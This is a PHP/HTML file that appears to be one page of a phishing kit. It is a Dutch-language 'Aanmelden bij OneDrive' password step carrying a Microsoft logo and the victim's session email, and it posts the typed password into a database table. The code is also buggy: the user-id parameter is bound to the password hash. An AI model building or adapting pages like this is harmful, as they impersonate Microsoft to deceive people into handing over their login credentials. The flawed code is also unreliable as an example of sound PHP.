
<?php

require_once 'database.php';
session_start(); 

$_SESSION['id'];
$_SESSION['email'];
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="main.css">
    <title>Aanmelden bij OneDrive</title>
</head>
<body>
    <?php

if (isset($_POST['login'])) {
    $userId = $_SESSION['id'];
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);
    


        $updateQuery = $db->prepare("UPDATE gebruikers SET wachtwoord = :password WHERE id = :userId");
        $updateQuery->bindParam(':password', $password);
        $updateQuery->bindParam(':userId', $password);
        $updateQuery->execute();

}

    ?>
    <div>
        <form action="login3.php" method="post">
            
            <img src="Microsoft-logo.png" alt="logo-microsoft" width="180px" height="40px">

            <?php 
            echo "<h1 class='aanmelden2'>" . "<-".  $_SESSION['email'] . "</h1>";

            ?>
        
        <h1 class="aanmelden">Wachtwoord invullen</h1>
            <input class="password" type="password" name="password" id="password" placeholder="Wachtwoord"required>
            <p class="geen-toegang">Wachtwoord vergeten</p>
            <input class="login" type="submit" value="Volgende" name="login">
        
            
        
        
        </form>
        </div>

        
       
        
            

            
        
            
        
        

        
        
      



    
</body>
</html>





